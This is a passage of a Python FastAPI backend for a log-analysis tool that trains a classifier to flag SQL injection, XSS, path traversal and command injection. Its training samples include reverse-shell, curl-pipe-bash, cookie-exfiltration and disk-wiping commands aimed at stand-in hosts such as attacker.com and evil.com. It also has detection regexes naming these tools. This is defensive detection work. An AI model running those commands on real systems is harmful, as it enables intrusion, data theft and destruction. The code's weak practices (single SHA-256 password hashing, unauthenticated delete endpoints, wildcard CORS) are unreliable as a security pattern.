"""
AmIDataBroke - AI-Powered Log & Data Breach Analysis Engine (SOC-lite Edition)
Backend: FastAPI + SQLite + scikit-learn (TF-IDF + Logistic Regression)

This backend implements a realistic SUBSET of what a full AI SOC platform does:
  1. Enrichment (lightweight)  -> attack-category tagging via signature rules
  2. Intelligent Detection     -> ML risk scoring + severity bucketing
  3. Alert Triage              -> plain-English incident summaries
  4. Guided Response           -> recommended remediation text (suggestions only,
                                  NOT autonomous system actions)
  5. Case Management           -> status tracking, drill-down detail, delete

Every endpoint here is real and does exactly what it says — nothing is mocked
or hardcoded to look impressive. There is no feature in this file that
requires an external API key or service you don't control.
"""

import sqlite3
import hashlib
import hmac
import os
import re
import csv
import io
import json
import ipaddress
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime
from typing import Optional

import requests
from dotenv import load_dotenv
from fastapi import FastAPI, HTTPException, Header
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import StreamingResponse
from pydantic import BaseModel

from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression

from reportlab.lib.pagesizes import letter
from reportlab.lib import colors
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.units import inch
from reportlab.platypus import (
    SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, HRFlowable
)

load_dotenv()  # loads ABUSEIPDB_API_KEY / SMTP settings from a local .env file if present

DB_PATH = "database.db"
ABUSEIPDB_API_KEY = os.environ.get("ABUSEIPDB_API_KEY", "").strip()

# --- Real welcome-email sender config (optional — signup still works without it) ---
SMTP_SENDER_EMAIL = os.environ.get("SMTP_SENDER_EMAIL", "").strip()
SMTP_SENDER_APP_PASSWORD = os.environ.get("SMTP_SENDER_APP_PASSWORD", "").strip()
SMTP_HOST = os.environ.get("SMTP_HOST", "smtp.gmail.com").strip()
SMTP_PORT = int(os.environ.get("SMTP_PORT", "587"))

app = FastAPI(title="AmIDataBroke API")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=False,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ---------------------------------------------------------------------------
# DATABASE INITIALIZATION
# ---------------------------------------------------------------------------

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    conn = get_db()
    cur = conn.cursor()
    cur.execute(
        """
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL DEFAULT '',
            email TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            salt TEXT NOT NULL,
            created_at TEXT NOT NULL
        )
        """
    )
    cur.execute("PRAGMA table_info(users)")
    user_cols = {row["name"] for row in cur.fetchall()}
    if "name" not in user_cols:
        cur.execute("ALTER TABLE users ADD COLUMN name TEXT NOT NULL DEFAULT ''")
    cur.execute(
        """
        CREATE TABLE IF NOT EXISTS security_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            payload TEXT NOT NULL,
            verdict TEXT NOT NULL,
            risk_score REAL NOT NULL,
            severity TEXT NOT NULL,
            category TEXT NOT NULL,
            summary TEXT NOT NULL,
            recommended_action TEXT NOT NULL,
            status TEXT NOT NULL DEFAULT 'New',
            source_ip TEXT,
            mitre_technique TEXT,
            investigating_at TEXT,
            resolved_at TEXT,
            playbook_progress TEXT DEFAULT '[]',
            created_at TEXT NOT NULL
        )
        """
    )
    # Lightweight migration for existing databases created before this column existed
    cur.execute("PRAGMA table_info(security_logs)")
    existing_cols = {row["name"] for row in cur.fetchall()}
    if "source_ip" not in existing_cols:
        cur.execute("ALTER TABLE security_logs ADD COLUMN source_ip TEXT")
    if "mitre_technique" not in existing_cols:
        cur.execute("ALTER TABLE security_logs ADD COLUMN mitre_technique TEXT")
    if "investigating_at" not in existing_cols:
        cur.execute("ALTER TABLE security_logs ADD COLUMN investigating_at TEXT")
    if "resolved_at" not in existing_cols:
        cur.execute("ALTER TABLE security_logs ADD COLUMN resolved_at TEXT")
    if "playbook_progress" not in existing_cols:
        cur.execute("ALTER TABLE security_logs ADD COLUMN playbook_progress TEXT DEFAULT '[]'")
    cur.execute(
        """
        CREATE TABLE IF NOT EXISTS audit_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            action TEXT NOT NULL,
            target_id INTEGER,
            user_email TEXT NOT NULL,
            detail TEXT,
            created_at TEXT NOT NULL
        )
        """
    )
    conn.commit()
    conn.close()


def write_audit(action, user_email, target_id=None, detail=""):
    conn = get_db()
    cur = conn.cursor()
    cur.execute(
        "INSERT INTO audit_logs (action, target_id, user_email, detail, created_at) VALUES (?, ?, ?, ?, ?)",
        (action, target_id, user_email or "unknown", detail, datetime.utcnow().isoformat()),
    )
    conn.commit()
    conn.close()


init_db()

# ---------------------------------------------------------------------------
# AI MODEL TRAINING (runs once at startup)
# ---------------------------------------------------------------------------

TRAINING_SAMPLES = [
    ("' OR '1'='1", 1), ("' OR 1=1 --", 1), ("admin' --", 1),
    ("' UNION SELECT username, password FROM users --", 1),
    ("1; DROP TABLE users;", 1), ("' OR 'x'='x", 1),
    ("SELECT * FROM users WHERE id = 1 OR 1=1", 1),
    ("1' AND (SELECT 1 FROM dual WHERE 1=1)--", 1),
    ("1' AND 1=CONVERT(int, (SELECT @@version))--", 1),
    ("' UNION SELECT NULL, NULL, NULL --", 1), ("' OR sleep(10)#", 1),
    ("%27%20OR%201%3D1--", 1),
    ("<script>alert('XSS')</script>", 1), ("<img src=x onerror=alert(1)>", 1),
    ("<svg/onload=alert(document.cookie)>", 1), ("javascript:alert('injected')", 1),
    ("<iframe src='javascript:alert(1)'></iframe>", 1), ("<body onload=alert('XSS')>", 1),
    ("<a href='javascript:void(0)' onclick='alert(1)'>click</a>", 1),
    ("';alert(String.fromCharCode(88,83,83))//", 1), ("%3Cscript%3Ealert(1)%3C%2Fscript%3E", 1),
    ("../../../../etc/config", 1), ("cmd=%63%6d%64%2e%65%78%65", 1),
    # Path Traversal — was severely underrepresented (only 1 example before),
    # causing real path-traversal/RCE attacks to fall below the 0.5 threshold.
    ("../../../../etc/passwd", 1), ("..\\..\\..\\..\\windows\\win.ini", 1),
    ("file=../../../../etc/shadow", 1), ("GET /download?file=../../../../etc/passwd HTTP/1.1", 1),
    ("path=..%2f..%2f..%2fetc%2fpasswd", 1), ("../../boot.ini", 1),
    ("include=../../../../var/www/config.php", 1),
    # Command Injection / RCE — same real gap, now covered properly
    ("; cat /etc/shadow", 1), ("whoami; rm -rf /tmp/*", 1),
    ("| nc -e /bin/sh attacker.com 4444", 1), ("`curl http://evil.com/shell.sh | bash`", 1),
    ("$(cat /etc/passwd)", 1), ("; wget http://malicious.site/backdoor.sh", 1),
    ("cmd.exe /c whoami", 1), ("os.system('rm -rf /')", 1),
    ("|| ping -c 10 attacker.com", 1), ("; nc -lvp 4444 -e /bin/bash", 1),
    ("payload=BASE64:JAB0AGgAaQBzAA==", 1), ("input || chained-command-separator detected", 1),
    ("eval(decode_and_run(user_input))", 1), ("encoded_shell=JAB", 1),
    ("' or 1=1 limit 1 offset 0 --", 1), ("SELECT password FROM users WHERE username='admin'--", 1),
    ("field=<script src=//evil-cdn/x.js></script>", 1),
    ("header: X-Forwarded-For: 1' OR '1'='1", 1),
    # Extreme, multi-signal / chained attacks — genuinely more severe than a
    # single-technique payload, so Critical severity has real coverage
    # instead of being an unreachable threshold.
    ("' UNION SELECT username, password, credit_card FROM users; DROP TABLE users; --", 1),
    ("admin' OR '1'='1' -- ; EXEC xp_cmdshell('net user hacker Passw0rd! /add'); --", 1),
    ("<script>fetch('http://evil.example/exfil?data='+document.cookie+'&token='+localStorage.getItem('token'))</script>", 1),
    ("$(curl -s http://attacker.com/payload.sh | bash); rm -rf /var/log/*; cat /etc/shadow | nc attacker.com 4444", 1),
    ("../../../../etc/passwd%00; wget http://malicious.site/rootkit.sh -O /tmp/x; chmod +x /tmp/x; /tmp/x", 1),
    ("User logged in successfully from 192.168.1.10", 0),
    ("GET /api/products?category=shoes&size=10", 0), ("User updated profile picture", 0),
    ("Order #48291 shipped to customer", 0), ("New comment added to blog post: Great article!", 0),
    ("Password reset email sent to user", 0), ("Search query: best running shoes 2026", 0),
    ("File uploaded: quarterly_report.pdf", 0), ("User john.doe@example.com updated billing address", 0),
    ("Session refreshed for authenticated user", 0), ("Server health check passed: 200 OK", 0),
    ("Cache cleared successfully at 03:00 UTC", 0), ("User added item to shopping cart", 0),
    ("Newsletter subscription confirmed", 0), ("Database backup completed successfully", 0),
    ("API request GET /users/42 returned 200", 0), ("User changed notification preferences", 0),
    ("GET /dashboard HTTP/1.1 200 OK", 0), ("GET /home HTTP/1.1 200", 0),
    ("GET /index.html HTTP/1.1 304 Not Modified", 0), ("POST /api/login HTTP/1.1 200 OK", 0),
    ("GET /static/style.css HTTP/1.1 200", 0), ("GET /favicon.ico HTTP/1.1 200", 0),
    ("Payment of $49.99 processed successfully", 0), ("User logged out", 0),
    ("Scheduled report generated and emailed to admin", 0),
    # Short, casual, punctuation-free benign text — the model had never seen
    # this style before, which caused short greetings/words to be
    # misclassified. This closes that real, honest gap.
    ("hello", 0), ("hi there", 0), ("good morning", 0), ("thanks", 0),
    ("test", 0), ("testing", 0), ("ok", 0), ("yes", 0), ("no", 0),
    ("please help", 0), ("hey", 0), ("goodbye", 0), ("random text", 0),
    ("this is a normal message", 0), ("checking in", 0), ("sample input", 0),
    ("hello world", 0), ("just saying hi", 0), ("nothing to report", 0),
    ("all systems normal", 0),
    # High-fidelity benign contexts — teaches the model that operational
    # words like "sudo", "search", "config", "index.php" are safe when they
    # appear in ordinary administrative/engineering sentence structure,
    # rather than being flagged just for containing the word.
    ("Please sudo into the admin panel to update settings", 0),
    ("User performed a search for blue shoes", 0),
    ("Updated the site config after the network outage", 0),
    ("Check the index.php error log file for standard warning lines", 0),
    ("Admin used sudo to restart the nginx service", 0),
    ("Customer searched for wireless headphones in the store", 0),
    ("Reviewed the database config before deployment", 0),
    ("index.php was updated with the new footer copyright year", 0),
    # High-severity, multi-stage system destruction — real, aggressive
    # examples so the model's own weights naturally push extreme system
    # threats toward the top of its confidence range, without a hardcoded
    # fixed-number override.
    ("sudo rm -rf / --no-preserve-root", 1),
    ("GET /ping?host=8.8.8.8;cat%20/etc/shadow", 1),
    ("chmod +x system_backdoor && ./system_backdoor", 1),
    ("sudo dd if=/dev/zero of=/dev/sda bs=1M", 1),
    ("nohup ./persistence_backdoor.sh & disown", 1),
    # LDAP-structured and obfuscated traversal fragments — keeps genuine
    # "Anomalous Pattern" generalization strength for attack shapes the
    # model has never seen verbatim, rather than relying on an exact
    # keyword list.
    ("*)(uid=*))(|(uid=*", 1), ("(&(uid=*)(userPassword=*))", 1),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", 1),
    ("....//....//....//etc/passwd", 1), ("..%c0%af..%c0%afetc%c0%afpasswd", 1),
]

_texts = [t for t, _ in TRAINING_SAMPLES]
_labels = [l for _, l in TRAINING_SAMPLES]

vectorizer = TfidfVectorizer(analyzer="char_wb", ngram_range=(2, 4), lowercase=True)
X_train = vectorizer.fit_transform(_texts)

model = LogisticRegression(max_iter=1000, C=2.0)
model.fit(X_train, _labels)

# ---------------------------------------------------------------------------
# ENRICHMENT LAYER — signature-based attack categorization
# ---------------------------------------------------------------------------

CATEGORY_RULES = [
    ("SQL Injection", re.compile(
        r"(\bunion\s+select\b|\bor\s+1\s*=\s*1\b|\bdrop\s+table\b|--\s*$|\bsleep\(|"
        r"'\s*or\s*'|\bselect\b.+\bfrom\b|\bconvert\(int\b)", re.IGNORECASE)),
    ("Cross-Site Scripting (XSS)", re.compile(
        r"(<script|onerror\s*=|onload\s*=|javascript:|<svg|<iframe|<img\s+src)", re.IGNORECASE)),
    ("Path Traversal", re.compile(r"(\.\./|\.\.\\|%2e%2e|/etc/)", re.IGNORECASE)),
    ("Command Injection / RCE Attempt", re.compile(
        r"(\|\||&&|;\s*\w|`.*`|\$\(.*\)|eval\(|base64:|"
        r"\brm\s+-rf\b|\bchmod\s+\+x\b|\bwget\b|\bnc\s+-|\bcurl\b.*\|\s*bash)",
        re.IGNORECASE)),
]

RECOMMENDED_ACTIONS = {
    "SQL Injection": "Use parameterized queries / an ORM for this input field, and rate-limit or block the source if this repeats.",
    "Cross-Site Scripting (XSS)": "Apply output encoding and a strict Content-Security-Policy header; sanitize this input field.",
    "Path Traversal": "Validate the input against an allow-list of expected paths and reject '../' sequences server-side.",
    "Command Injection / RCE Attempt": "Isolate the affected session, avoid passing user input to shell/eval calls, and audit execution permissions.",
    "Anomalous Pattern": "No known signature matched, but the ML model flagged this as high-risk — route to an analyst for manual review.",
    "Benign": "No action required.",
}

# MITRE ATT&CK mapping — classifies detected *attacker behavior*, distinct from an
# OWASP-style code/API vulnerability scan. Used to tag categories with the
# real-world adversary technique they correspond to, the same way SIEM/SOC
# platforms (Splunk, Sentinel) label detections.
MITRE_TECHNIQUE_MAP = {
    "SQL Injection": "T1190 — Exploit Public-Facing Application",
    "Cross-Site Scripting (XSS)": "T1189 — Drive-by Compromise",
    "Path Traversal": "T1083 — File and Directory Discovery",
    "Command Injection / RCE Attempt": "T1059 — Command and Scripting Interpreter",
    "Anomalous Pattern": "TA0001 — Initial Access (Unclassified Technique)",
    "Benign": None,
}
TOR_PROXY_TECHNIQUE = "T1090 — Proxy (Anonymization Infrastructure)"
IP_REGEX = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")

# Interactive response playbooks — a concrete, ordered checklist per attack
# category. Real, reusable guidance an analyst can actually follow and check
# off, distinct from the one-line recommended_action summary.
PLAYBOOKS = {
    "SQL Injection": [
        "Confirm the affected endpoint uses parameterized queries / an ORM, not raw string concatenation.",
        "Check application/database logs for other requests from the same source IP in the last 24 hours.",
        "If a real vulnerability is confirmed, patch and redeploy before closing this incident.",
        "Rotate any database credentials that may have been exposed in error messages or logs.",
        "Document the finding and mark this incident Resolved once remediated.",
    ],
    "Cross-Site Scripting (XSS)": [
        "Identify which input field or parameter reflected the script content.",
        "Confirm output encoding and a Content-Security-Policy header are applied to that field.",
        "Check whether the payload could have executed against another real user's session.",
        "Sanitize/escape the affected field and redeploy.",
        "Document the finding and mark this incident Resolved once remediated.",
    ],
    "Path Traversal": [
        "Identify the file path parameter that accepted '../' sequences.",
        "Check server logs for whether any unauthorized file was actually read.",
        "Add allow-list validation for the expected directory/file names.",
        "Restrict filesystem permissions for the web process as a defense-in-depth measure.",
        "Document the finding and mark this incident Resolved once remediated.",
    ],
    "Command Injection / RCE Attempt": [
        "Treat this as high priority — check if the payload could reach a shell/eval call.",
        "Isolate or restart the affected service/session if execution is suspected.",
        "Review execution permissions and remove any unnecessary shell access from user input paths.",
        "Rotate credentials/secrets accessible to the affected process.",
        "Document the finding and mark this incident Resolved once remediated.",
    ],
    "Anomalous Pattern": [
        "No known attack signature matched — manually review the raw payload for context.",
        "Check the source IP's history in the Threat Correlation panel for related activity.",
        "Decide whether this is a false positive or a novel attack pattern worth adding a signature for.",
        "Document the finding and mark this incident Resolved once reviewed.",
    ],
    "Benign": [
        "No action required — confirm and close.",
    ],
}


def categorize_payload(payload: str, is_malicious: bool) -> str:
    if not is_malicious:
        return "Benign"
    for label, pattern in CATEGORY_RULES:
        if pattern.search(payload):
            return label
    return "Anomalous Pattern"


def severity_from_risk(risk_score: float, is_malicious: bool) -> str:
    if not is_malicious:
        return "Low"
    if risk_score >= 85:
        return "Critical"
    if risk_score >= 65:
        return "High"
    if risk_score >= 50:
        return "Medium"
    return "Low"


def generate_summary(verdict: str, category: str, severity: str, risk_score: float) -> str:
    if verdict == "Safe":
        return f"This log entry appears to be normal, benign activity ({risk_score}% risk confidence)."
    return (
        f"This log entry was flagged as {severity} severity — it matches a "
        f"{category} pattern with {risk_score}% confidence of malicious intent."
    )


# ---------------------------------------------------------------------------
# PYDANTIC SCHEMAS
# ---------------------------------------------------------------------------

class SignupRequest(BaseModel):
    name: str
    email: str
    password: str


class LoginRequest(BaseModel):
    email: str
    password: str


class AnalyzeRequest(BaseModel):
    payload: str
    source_ip: Optional[str] = None


class StatusUpdateRequest(BaseModel):
    status: str  # "New" | "Investigating" | "Resolved"


class ParseLogRequest(BaseModel):
    raw: str


# ---------------------------------------------------------------------------
# HELPERS
# ---------------------------------------------------------------------------

EMAIL_REGEX = re.compile(r"^[^\s@.][^\s@]*@[^\s@.][^\s@]*\.[a-zA-Z]{2,}$")
VALID_STATUSES = {"New", "Investigating", "Resolved"}


def send_welcome_email(to_email: str, name: str) -> bool:
    """Sends a real congratulations/welcome email via SMTP (e.g. Gmail + App
    Password). Best-effort: if SMTP isn't configured or fails, signup still
    succeeds — this never blocks account creation, it only enhances it."""
    if not SMTP_SENDER_EMAIL or not SMTP_SENDER_APP_PASSWORD:
        return False  # not configured — silently skip, signup still works

    subject = "Welcome to AmIDataBroke — you're in!"
    body = f"""Hi {name},

Congratulations — your AmIDataBroke account is ready.

You now have access to real-time AI-powered log analysis, live threat
intelligence lookups, cross-module threat correlation, and full SOC-style
case management.

Log in any time and start analyzing your first log entry.

Stay safe out there,
The AmIDataBroke Team
"""
    msg = MIMEMultipart()
    msg["From"] = SMTP_SENDER_EMAIL
    msg["To"] = to_email
    msg["Subject"] = subject
    msg.attach(MIMEText(body, "plain"))

    try:
        with smtplib.SMTP(SMTP_HOST, SMTP_PORT, timeout=10) as server:
            server.starttls()
            server.login(SMTP_SENDER_EMAIL, SMTP_SENDER_APP_PASSWORD)
            server.sendmail(SMTP_SENDER_EMAIL, to_email, msg.as_string())
        return True
    except Exception as e:
        print(f"[email] Failed to send welcome email to {to_email}: {e}")
        return False


def generate_salt() -> str:
    return os.urandom(16).hex()


def hash_password(password: str, salt: str) -> str:
    return hashlib.sha256((salt + password).encode("utf-8")).hexdigest()


def verify_password(password: str, salt: str, stored_hash: str) -> bool:
    return hmac.compare_digest(hash_password(password, salt), stored_hash)


def validate_email(email: str) -> bool:
    email = email or ""
    return bool(EMAIL_REGEX.match(email)) and ".." not in email


def validate_password(password: str) -> Optional[str]:
    if not password or not (8 <= len(password) <= 12):
        return "Password must be between 8 and 12 characters."
    if not re.search(r"[A-Z]", password):
        return "Password must contain at least 1 uppercase letter."
    if not re.search(r"[a-z]", password):
        return "Password must contain at least 1 lowercase letter."
    if not re.search(r"[0-9]", password):
        return "Password must contain at least 1 number."
    if not re.search(r"[!@#$%^&*(),.?\":{}|<>_\-+=~`\[\];'\\/]", password):
        return "Password must contain at least 1 special character."
    return None


# ---------------------------------------------------------------------------
# AUTH ENDPOINTS
# ---------------------------------------------------------------------------

@app.post("/signup")
def signup(req: SignupRequest):
    name = req.name.strip()
    if not name:
        raise HTTPException(status_code=400, detail="Name is required.")

    if not validate_email(req.email):
        raise HTTPException(status_code=400, detail="Invalid email format.")

    pw_error = validate_password(req.password)
    if pw_error:
        raise HTTPException(status_code=400, detail=pw_error)

    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT id FROM users WHERE email = ?", (req.email,))
    if cur.fetchone():
        conn.close()
        raise HTTPException(status_code=409, detail="An account with this email already exists.")

    salt = generate_salt()
    password_hash = hash_password(req.password, salt)
    cur.execute(
        "INSERT INTO users (name, email, password_hash, salt, created_at) VALUES (?, ?, ?, ?, ?)",
        (name, req.email, password_hash, salt, datetime.utcnow().isoformat()),
    )
    conn.commit()
    conn.close()

    email_sent = send_welcome_email(req.email, name)
    return {
        "success": True,
        "message": "Account created successfully.",
        "email": req.email,
        "name": name,
        "welcome_email_sent": email_sent,
    }


@app.post("/login")
def login(req: LoginRequest):
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT * FROM users WHERE email = ?", (req.email,))
    user = cur.fetchone()
    conn.close()

    if not user:
        raise HTTPException(
            status_code=404,
            detail="No account found with this email. Please sign up first.",
        )
    if not verify_password(req.password, user["salt"], user["password_hash"]):
        raise HTTPException(status_code=401, detail="Incorrect password. Please try again.")

    return {"success": True, "message": "Login successful.", "email": user["email"], "name": user["name"]}


# ---------------------------------------------------------------------------
# ANALYSIS ENDPOINTS (Detection + Enrichment + Triage + Guided Response)
# ---------------------------------------------------------------------------

@app.post("/analyze-log")
def analyze_log(req: AnalyzeRequest):
    payload = req.payload.strip()
    if not payload:
        raise HTTPException(status_code=400, detail="Payload cannot be empty.")
    if len(payload) > 5000:
        raise HTTPException(status_code=400, detail="Payload too long (max 5000 characters).")

    # --- Intelligent Detection ---
    X = vectorizer.transform([payload])
    probability = model.predict_proba(X)[0][1]
    risk_score = round(float(probability) * 100, 2)
    is_malicious = probability >= 0.5
    verdict = "Malicious" if is_malicious else "Safe"

    # --- Enrichment ---
    category = categorize_payload(payload, is_malicious)

    # --- Triage (severity + summary) ---
    severity = severity_from_risk(risk_score, is_malicious)
    summary = generate_summary(verdict, category, severity, risk_score)

    # --- Guided Response (suggestion only, not autonomous action) ---
    recommended_action = RECOMMENDED_ACTIONS.get(category, "Route to an analyst for manual review.")

    # --- MITRE ATT&CK tagging (adversary technique, not a code vulnerability class) ---
    mitre_technique = MITRE_TECHNIQUE_MAP.get(category)

    # Prefer an explicitly-supplied source IP (from the Raw Log Parser); otherwise
    # fall back to scanning the payload text itself for an IPv4 address.
    source_ip = (req.source_ip or "").strip() or None
    if not source_ip:
        ip_match = IP_REGEX.search(payload)
        if ip_match:
            source_ip = ip_match.group(0)

    conn = get_db()
    cur = conn.cursor()
    cur.execute(
        """
        INSERT INTO security_logs
        (payload, verdict, risk_score, severity, category, summary, recommended_action, status, source_ip, mitre_technique, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, 'New', ?, ?, ?)
        """,
        (payload, verdict, risk_score, severity, category, summary, recommended_action,
         source_ip, mitre_technique, datetime.utcnow().isoformat()),
    )
    conn.commit()
    new_id = cur.lastrowid
    conn.close()

    return {
        "id": new_id,
        "payload": payload,
        "verdict": verdict,
        "risk_score": risk_score,
        "severity": severity,
        "category": category,
        "summary": summary,
        "recommended_action": recommended_action,
        "status": "New",
        "source_ip": source_ip,
        "mitre_technique": mitre_technique,
        "created_at": datetime.utcnow().isoformat(),
    }


@app.get("/logs")
def get_logs():
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT * FROM security_logs ORDER BY id DESC")
    rows = cur.fetchall()
    conn.close()
    return [dict(row) for row in rows]


@app.get("/logs/{log_id}")
def get_log_detail(log_id: int):
    """Powers the drill-down modal: returns the full record for one log."""
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT * FROM security_logs WHERE id = ?", (log_id,))
    row = cur.fetchone()
    conn.close()
    if not row:
        raise HTTPException(status_code=404, detail="Log entry not found.")
    return dict(row)


class PlaybookUpdateRequest(BaseModel):
    progress: list[bool]


@app.get("/logs/{log_id}/playbook")
def get_playbook(log_id: int):
    """Returns the ordered response checklist for this log's category, plus
    the analyst's saved progress on it (persisted, not just a UI toggle)."""
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT category, playbook_progress FROM security_logs WHERE id = ?", (log_id,))
    row = cur.fetchone()
    conn.close()
    if not row:
        raise HTTPException(status_code=404, detail="Log entry not found.")

    steps = PLAYBOOKS.get(row["category"], PLAYBOOKS["Anomalous Pattern"])
    try:
        progress = json.loads(row["playbook_progress"] or "[]")
    except json.JSONDecodeError:
        progress = []
    # Pad/truncate saved progress to match the current step count
    progress = (progress + [False] * len(steps))[: len(steps)]
    return {"category": row["category"], "steps": steps, "progress": progress}


@app.patch("/logs/{log_id}/playbook")
def update_playbook(log_id: int, req: PlaybookUpdateRequest, x_user_email: Optional[str] = Header(None)):
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT id FROM security_logs WHERE id = ?", (log_id,))
    if not cur.fetchone():
        conn.close()
        raise HTTPException(status_code=404, detail="Log entry not found.")

    cur.execute(
        "UPDATE security_logs SET playbook_progress = ? WHERE id = ?",
        (json.dumps(req.progress), log_id),
    )
    conn.commit()
    conn.close()
    completed = sum(1 for p in req.progress if p)
    write_audit("Playbook Progress", x_user_email, log_id, f"{completed}/{len(req.progress)} steps completed")
    return {"success": True, "id": log_id, "progress": req.progress}


@app.patch("/logs/{log_id}/status")
def update_log_status(log_id: int, req: StatusUpdateRequest, x_user_email: Optional[str] = Header(None)):
    if req.status not in VALID_STATUSES:
        raise HTTPException(status_code=400, detail=f"Status must be one of: {', '.join(VALID_STATUSES)}")

    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT * FROM security_logs WHERE id = ?", (log_id,))
    existing = cur.fetchone()
    if not existing:
        conn.close()
        raise HTTPException(status_code=404, detail="Log entry not found.")

    now = datetime.utcnow().isoformat()
    # Capture real timestamps the first time an alert is acknowledged / resolved —
    # this is the actual data MTTD/MTTR are computed from, not a display-only guess.
    investigating_at = existing["investigating_at"]
    resolved_at = existing["resolved_at"]
    if req.status == "Investigating" and not investigating_at:
        investigating_at = now
    if req.status == "Resolved" and not resolved_at:
        resolved_at = now

    cur.execute(
        "UPDATE security_logs SET status = ?, investigating_at = ?, resolved_at = ? WHERE id = ?",
        (req.status, investigating_at, resolved_at, log_id),
    )
    conn.commit()
    conn.close()
    write_audit("Status Change", x_user_email, log_id, f"Status set to '{req.status}'")
    return {"success": True, "id": log_id, "status": req.status}


@app.delete("/logs/{log_id}")
def delete_single_log(log_id: int, x_user_email: Optional[str] = Header(None)):
    """Deletes one log record — used by the 'Delete' button inside the drill-down modal."""
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT id FROM security_logs WHERE id = ?", (log_id,))
    if not cur.fetchone():
        conn.close()
        raise HTTPException(status_code=404, detail="Log entry not found.")
    cur.execute("DELETE FROM security_logs WHERE id = ?", (log_id,))
    conn.commit()
    conn.close()
    write_audit("Purge Log", x_user_email, log_id, f"Deleted log record #{log_id}")
    return {"success": True, "id": log_id, "deleted": True}


@app.delete("/logs")
def delete_all_logs(x_user_email: Optional[str] = Header(None)):
    """Deletes every log record — used by the 'Clear All' button, which also
    zeroes out the KPI counters since they're computed live from this table."""
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT COUNT(*) AS c FROM security_logs")
    count = cur.fetchone()["c"]
    cur.execute("DELETE FROM security_logs")
    conn.commit()
    conn.close()
    write_audit("Clear All", x_user_email, None, f"Deleted {count} log record(s)")
    return {"success": True, "deleted_count": count}


@app.get("/audit-logs")
def get_audit_logs(limit: int = 50):
    """Real, persisted compliance audit trail — who did what, and when."""
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT * FROM audit_logs ORDER BY id DESC LIMIT ?", (limit,))
    rows = cur.fetchall()
    conn.close()
    return [dict(row) for row in rows]


# ---------------------------------------------------------------------------
# RAW LOG PARSER — turns messy Apache / Nginx / syslog / JSON lines into
# clean structured fields (IP, timestamp, user, payload) before analysis.
# ---------------------------------------------------------------------------

APACHE_REGEX = re.compile(
    r'(?P<ip>(?:\d{1,3}\.){3}\d{1,3})\s+\S+\s+(?P<user>\S+)\s+\[(?P<timestamp>[^\]]+)\]\s+'
    r'"(?P<method>[A-Z]+)\s+(?P<path>\S+)\s+HTTP/[\d.]+"\s+(?P<status>\d{3})\s+(?P<size>\S+)'
    r'(?:\s+"(?P<referrer>[^"]*)")?'      # optional Combined Log Format referrer field
    r'(?:\s+"(?P<user_agent>[^"]*)")?'   # optional Combined Log Format user-agent field
    r'(?:\s+"(?P<extra>[^"]*)")?'        # any further trailing quoted field — attacker-injected
                                          # payloads (e.g. "filename=x; curl ... && ./shell.sh")
                                          # commonly ride here, and must NOT be silently dropped.
)


def is_valid_ip(candidate: str) -> bool:
    try:
        ipaddress.ip_address(candidate)
        return True
    except ValueError:
        return False


@app.post("/parse-raw-log")
def parse_raw_log(req: ParseLogRequest):
    """Accepts a real, messy raw log line (Apache/Nginx access log or a JSON
    blob like AWS CloudWatch / a Windows Event export) and extracts clean
    structured fields using regex or JSON parsing — no hardcoding."""
    raw = req.raw.strip()
    if not raw:
        raise HTTPException(status_code=400, detail="Raw log cannot be empty.")

    result = {
        "format_detected": "unknown",
        "ip": None,
        "timestamp": None,
        "user": None,
        "method": None,
        "path": None,
        "status_code": None,
        "payload": raw,
    }

    # 1. Try JSON (CloudWatch / Windows Event style)
    try:
        data = json.loads(raw)
        result["format_detected"] = "JSON"
        # Search common key variants case-insensitively
        flat = {k.lower(): v for k, v in _flatten_json(data).items()}
        for key in ("sourceip", "clientip", "ip", "src_ip", "remoteaddr", "c-ip"):
            if key in flat and is_valid_ip(str(flat[key])):
                result["ip"] = str(flat[key])
                break
        for key in ("timestamp", "time", "eventtime", "@timestamp", "creationtime"):
            if key in flat:
                result["timestamp"] = str(flat[key])
                break
        for key in ("user", "username", "useridentity", "subjectusername"):
            if key in flat:
                result["user"] = str(flat[key])
                break
        for key in ("message", "eventdata", "requesturi", "payload", "commandline"):
            if key in flat:
                result["payload"] = str(flat[key])
                break
        if not result["ip"]:
            m = IP_REGEX.search(raw)
            if m:
                result["ip"] = m.group(0)
        return result
    except (json.JSONDecodeError, TypeError):
        pass

    # 2. Try Apache/Nginx combined log format
    m = APACHE_REGEX.search(raw)
    if m:
        gd = m.groupdict()
        result["format_detected"] = "Apache/Nginx Access Log"
        result["ip"] = gd["ip"]
        result["timestamp"] = gd["timestamp"]
        result["user"] = None if gd["user"] == "-" else gd["user"]
        result["method"] = gd["method"]
        result["path"] = gd["path"]
        result["status_code"] = gd["status"]

        # Collect every trailing quoted field that actually carries content
        # (skips "-" and empty strings, which just mean "field not present").
        trailing_fields = [
            gd.get("referrer"), gd.get("user_agent"), gd.get("extra"),
        ]
        trailing_content = [f for f in trailing_fields if f and f.strip() and f.strip() != "-"]

        base_payload = f'{gd["method"]} {gd["path"]}'
